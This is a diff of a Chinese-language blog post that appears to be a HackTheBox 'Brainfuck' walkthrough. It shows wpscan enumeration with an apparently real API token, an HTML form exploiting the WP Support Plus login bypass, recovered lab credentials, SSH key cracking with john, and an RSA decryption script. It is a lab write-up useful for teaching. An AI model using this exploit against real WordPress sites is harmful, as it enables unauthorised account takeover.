@@ -28,29 +28,34 @@
 <meta property="og:site_name" content="Love ❤ Hacking">
 <meta property="og:description" content="发现443端口运行了https服务，登录之后是一个nginx的欢迎页面在&#x2F;etc&#x2F;hosts中添加ip">
 <meta property="og:locale">
-<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/1.jpg">
-<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/2.jpg">
-<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/3.jpg">
-<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/4.jpg">
-<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/5.jpg">
-<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/6.jpg">
-<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/7.jpg">
-<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/8.jpg">
-<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/9.jpg">
-<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/10.jpg">
-<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/11.jpg">
-<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/12.jpg">
-<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/13.jpg">
-<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/16.png">
-<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/17.png">
-<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/14.jpg">
-<meta property="og:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/15.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/1.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/2.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/3.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/4.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/5.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/6.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/7.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/8.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/9.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/10.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/11.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/12.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/13.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/16.png">
+<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/17.png">
+<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/18.png">
+<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/19.png">
+<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/20.png">
+<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/14.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/15.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/21.png">
+<meta property="og:image" content="http://evilarsene.icu/images/brainfuck/22.png">
 <meta property="article:published_time" content="2020-06-05T07:30:25.000Z">
-<meta property="article:modified_time" content="2021-05-06T15:55:41.763Z">
+<meta property="article:modified_time" content="2021-05-09T15:32:28.312Z">
 <meta property="article:author" content="EvilArsene">
 <meta property="article:tag" content="Linux靶机">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://evilarsene.icu/2020/06/05/images/brainfuck/1.jpg">
+<meta name="twitter:image" content="http://evilarsene.icu/images/brainfuck/1.jpg">
 
 <link rel="canonical" href="http://evilarsene.icu/2020/06/05/HTB-Brainfuck/">
 
@@ -240,7 +245,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-05-06 23:55:41" itemprop="dateModified" datetime="2021-05-06T23:55:41+08:00">2021-05-06</time>
+                <time title="修改时间：2021-05-09 23:32:28" itemprop="dateModified" datetime="2021-05-09T23:32:28+08:00">2021-05-09</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -263,64 +268,79 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="Brainfuck"><a href="#Brainfuck" class="headerlink" title="Brainfuck"></a>Brainfuck</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="../images/brainfuck/1.jpg" alt="1"></p>
-<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>发现443端口运行了https服务，登录之后是一个nginx的欢迎页面<br>在/etc/hosts中添加ip</p>
-<p><img src="../images/brainfuck/2.jpg" alt="2"></p>
+        <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/brainfuck/1.jpg" alt="1"></p>
+<p>发现443端口运行了https服务，登录之后是一个nginx的欢迎页面<br>在/etc/hosts中添加ip</p>
+<p><img src="/images/brainfuck/2.jpg" alt="2"></p>
 <p>之后就可以正常访问了</p>
-<p><img src="../images/brainfuck/3.jpg" alt="3"></p>
-<p>这是一个wordpress站点</p>
-<h4 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h4><p>对wordpress进行扫描</p>
+<p><img src="/images/brainfuck/3.jpg" alt="3"></p>
+<p>这是一个wordpress站点，可以进行扫描</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --api-token zBDf1JO6FsSNPZjosgaoPHKg8f049ar0FhEFDumlGjg --url https:&#x2F;&#x2F;brainfuck.htb&#x2F; --disable-tls-checks</span><br></pre></td></tr></table></figure>
 
-<p><img src="../images/brainfuck/4.jpg" alt="4"></p>
+<p><img src="/images/brainfuck/4.jpg" alt="4"></p>
 <p>发现了wp support plus存在的漏洞</p>
 <p>接着对wordpress进行用户名枚举</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url https:&#x2F;&#x2F;brainfuck.htb&#x2F; --disable-tls-checks --enumerate u</span><br></pre></td></tr></table></figure>
 
-<p><img src="../images/brainfuck/5.jpg" alt="5"></p>
+<p><img src="/images/brainfuck/5.jpg" alt="5"></p>
 <p>发现了2个账号</p>
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h3><p><img src="../images/brainfuck/6.jpg" alt="6"></p>
-<p><img src="../images/brainfuck/7.jpg" alt="7"></p>
+<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p><img src="/images/brainfuck/6.jpg" alt="6"></p>
+<p><img src="/images/brainfuck/7.jpg" alt="7"></p>
 <p>这个权限提升漏洞可以让你不知道秘密的情况下进行 登录，不过需要知道用户名</p>
 <p>我们在本地web服务创建HTML页面</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;https:&#x2F;&#x2F;brainfuck.htb&#x2F;wp-admin&#x2F;admin-ajax.php&quot;&gt;</span><br><span class="line">        Username: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;administrator&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;email&quot; value&#x3D;&quot;sth&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;action&quot; value&#x3D;&quot;loginGuestFacebook&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Login&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="../images/brainfuck/8.jpg" alt="8"></p>
+<p><img src="/images/brainfuck/8.jpg" alt="8"></p>
 <p>等待一会儿</p>
-<p><img src="../images/brainfuck/9.jpg" alt="9"></p>
+<p><img src="/images/brainfuck/9.jpg" alt="9"></p>
 <p>这时候再回到主页</p>
-<p><img src="../images/brainfuck/10.jpg" alt="10"></p>
+<p><img src="/images/brainfuck/10.jpg" alt="10"></p>
 <p>发现我们已经获得了cookie成功登录了账号</p>
 <p>两个账号都没有对插件的写权限，不能写入shell，不过在admin账号下，发现了</p>
-<p><img src="../images/brainfuck/11.jpg" alt="11"></p>
+<p><img src="/images/brainfuck/11.jpg" alt="11"></p>
 <p>SMTP账号密码orestis/kHGuERB29DNiNE</p>
 <p>之后我就可以利用获取的账号和密码访问pop3服务</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~#nc -nv 10.10.10.17 110</span><br><span class="line">USER orestis</span><br><span class="line">PASS kHGuERB29DNiNE</span><br><span class="line">stat</span><br><span class="line">retr1</span><br><span class="line">retr2</span><br></pre></td></tr></table></figure>
 
-<p><img src="../images/brainfuck/12.jpg" alt="12"></p>
+<p><img src="/images/brainfuck/12.jpg" alt="12"></p>
 <p>在第二封邮件里发现了账号和密码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: orestis</span><br><span class="line">password: kIEnnfEKJ#9UmdO</span><br></pre></td></tr></table></figure>
 
 <p>使用这个密码可以登录<code>https://sup3rs3cr3t.brainfuck.htb/</code></p>
-<p><img src="../images/brainfuck/13.jpg" alt="13"></p>
+<p><img src="/images/brainfuck/13.jpg" alt="13"></p>
 <p>在其中一个会话中发现了加密通讯信息</p>
-<p><img src="../images/brainfuck/16.png" alt="16"></p>
+<p><img src="/images/brainfuck/16.png" alt="16"></p>
 <p>这里破解需要另一个论坛上的信息</p>
-<p><img src="../images/brainfuck/17.png" alt="17"></p>
+<p><img src="/images/brainfuck/17.png" alt="17"></p>
 <p>可以猜到签名部分应该是相同的内容，但这里显示的字符串并不相同</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Pieagnm - Jkoijeg nbw zwx mle grwsnn</span><br><span class="line">Wejmvse - Fbtkqal zqb rso rnl cwihsf</span><br><span class="line">Qbqquzs - Pnhekxs dpi fca fhf zdmgzt</span><br><span class="line">Orestis - Hacking for fun and profit</span><br></pre></td></tr></table></figure>
 
-<p><a target="_blank" rel="noopener" href="http://rumkin.com/tools/cipher/otp.php">http://rumkin.com/tools/cipher/otp.php</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">正文O对应P	反应b</span><br><span class="line">正文r对应i	反应r</span><br></pre></td></tr></table></figure>
-
-<p>破解其中对话，获得URL<code>https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa</code></p>
+<p>我们可以猜测它使用了维吉尼亚密码，然后此<a target="_blank" rel="noopener" href="http://rumkin.com/tools/cipher/otp.php">链接</a>可以快速计算出密钥<code>fuckmybrain</code></p>
+<p><img src="/images/brainfuck/18.png" alt="18"></p>
+<p>之后发现了一处加密的信息，疑似url</p>
+<p><img src="/images/brainfuck/19.png" alt="19"></p>
+<p>使用之前的密钥来解密这个url，可以在<a target="_blank" rel="noopener" href="http://rumkin.com/tools/cipher/vigenere-keyed.php">链接</a>处快速解密</p>
+<p><img src="/images/brainfuck/20.png" alt="20"></p>
+<p>获得URL<code>https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa</code></p>
 <p>下载<code>id_rsa</code>,还需要破解它</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:&#x2F;usr&#x2F;share&#x2F;john#python ssh2john.py &#x2F;root&#x2F;Desktop&#x2F;id_rsa &gt; &#x2F;root&#x2F;Desktop&#x2F;pass.txt</span><br><span class="line">root@kali:~&#x2F;Desktop#john pass.txt --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt </span><br></pre></td></tr></table></figure>
 
-<p><img src="../images/brainfuck/14.jpg" alt="14"></p>
-<p>得出密钥:<code>3poulakia!</code></p>
-<p><img src="../images/brainfuck/15.jpg" alt="15"></p>
-<p>之后就可以进行ssh连接获取shell</p>
+<p><img src="/images/brainfuck/14.jpg" alt="14"></p>
+<p>得出密钥:<code>3poulakia!</code>，之后就可以进行ssh连接获取shell</p>
+<p><img src="/images/brainfuck/15.jpg" alt="15"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>在家目录发现了奇怪的python脚本</p>
+<p><img src="/images/brainfuck/21.png" alt="21"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">nbits &#x3D; 1024</span><br><span class="line"></span><br><span class="line">password &#x3D; open(&quot;&#x2F;root&#x2F;root.txt&quot;).read().strip()</span><br><span class="line">enc_pass &#x3D; open(&quot;output.txt&quot;,&quot;w&quot;)</span><br><span class="line">debug &#x3D; open(&quot;debug.txt&quot;,&quot;w&quot;)</span><br><span class="line">m &#x3D; Integer(int(password.encode(&#39;hex&#39;),16))</span><br><span class="line"></span><br><span class="line">p &#x3D; random_prime(2^floor(nbits&#x2F;2)-1, lbound&#x3D;2^floor(nbits&#x2F;2-1), proof&#x3D;False)</span><br><span class="line">q &#x3D; random_prime(2^floor(nbits&#x2F;2)-1, lbound&#x3D;2^floor(nbits&#x2F;2-1), proof&#x3D;False)</span><br><span class="line">n &#x3D; p*q</span><br><span class="line">phi &#x3D; (p-1)*(q-1)</span><br><span class="line">e &#x3D; ZZ.random_element(phi)</span><br><span class="line">while gcd(e, phi) !&#x3D; 1:</span><br><span class="line">    e &#x3D; ZZ.random_element(phi)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c &#x3D; pow(m, e, n)</span><br><span class="line">enc_pass.write(&#39;Encrypted Password: &#39;+str(c)+&#39;\n&#39;)</span><br><span class="line">debug.write(str(p)+&#39;\n&#39;)</span><br><span class="line">debug.write(str(q)+&#39;\n&#39;)</span><br><span class="line">debug.write(str(e)+&#39;\n&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>所以我们已经有了p和q，那是RSA的私钥，我们应该可以对其进行破解。找到了一个好用的脚本:<a target="_blank" rel="noopener" href="https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e">链接</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">def egcd(a, b):</span><br><span class="line">    x,y, u,v &#x3D; 0,1, 1,0</span><br><span class="line">    while a !&#x3D; 0:</span><br><span class="line">        q, r &#x3D; b&#x2F;&#x2F;a, b%a</span><br><span class="line">        m, n &#x3D; x-u*q, y-v*q</span><br><span class="line">        b,a, x,y, u,v &#x3D; a,r, u,v, m,n</span><br><span class="line">        gcd &#x3D; b</span><br><span class="line">    return gcd, x, y</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    p &#x3D; 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307</span><br><span class="line">    q &#x3D; 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079</span><br><span class="line">    e &#x3D; 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997</span><br><span class="line">    ct &#x3D; 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182</span><br><span class="line"></span><br><span class="line">    # compute n</span><br><span class="line">    n &#x3D; p * q</span><br><span class="line"></span><br><span class="line">    # Compute phi(n)</span><br><span class="line">    phi &#x3D; (p - 1) * (q - 1)</span><br><span class="line"></span><br><span class="line">    # Compute modular inverse of e</span><br><span class="line">    gcd, a, b &#x3D; egcd(e, phi)</span><br><span class="line">    d &#x3D; a</span><br><span class="line"></span><br><span class="line">    print( &quot;n:  &quot; + str(d) );</span><br><span class="line"></span><br><span class="line">    # Decrypt ciphertext</span><br><span class="line">    pt &#x3D; pow(ct, d, n)</span><br><span class="line">    print( &quot;pt: &quot; + str(pt) )</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>得到输出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977</span><br><span class="line">pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750</span><br></pre></td></tr></table></figure>
+
+<p>pt就是解密后的明文了，再对照着源码dec转hex转ascii，应该就可以得到真正的明文了，也就是flag了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line"></span><br><span class="line">pt &#x3D; 24604052029401386049980296953784287079059245867880966944246662849341507003750</span><br><span class="line">hexstr&#x3D;hex(pt)[2:]  #去除0x</span><br><span class="line">print(bytes.fromhex(hexstr).decode(&#39;utf-8&#39;))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/brainfuck/22.png" alt="22"></p>
 
     </div>
 
@@ -404,7 +424,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Brainfuck"><span class="nav-number">1.</span> <span class="nav-text">Brainfuck</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.1.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.1.2.</span> <span class="nav-text">枚举</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#wpscan"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">wpscan</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-number">1.2.</span> <span class="nav-text">渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#searchsploit"><span class="nav-number">1.2.1.</span> <span class="nav-text">searchsploit</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-number">2.</span> <span class="nav-text">渗透</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
